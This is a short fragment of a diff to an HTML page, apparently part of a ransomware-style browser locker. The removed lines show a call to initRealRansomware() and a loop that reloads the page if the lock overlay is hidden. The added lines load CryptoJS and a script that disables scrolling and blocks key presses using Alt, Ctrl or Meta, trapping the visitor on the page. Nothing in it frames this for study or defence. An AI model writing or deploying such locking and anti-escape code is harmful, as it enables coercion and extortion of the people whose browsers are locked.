-                if (layer && window.getComputedStyle(layer).display === 'none') location.reload();
-            }
-        }, 25);
-    }
-    
-    initRealRansomware();
+    })();
 </script>
 
+<!-- CryptoJS library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+<script>
+    // Final lock - disable scroll
+    document.body.style.overflow = 'hidden';
+    document.documentElement.style.overflow = 'hidden';
+    
+    // Blokir semua tombol fungsi
+    window.onkeydown = function(e) {
+        if(e.altKey || e.ctrlKey || e.metaKey) {
+            e.preventDefault();
+            return false;
+        }
+    };
+</script>
 </body>
 </html>
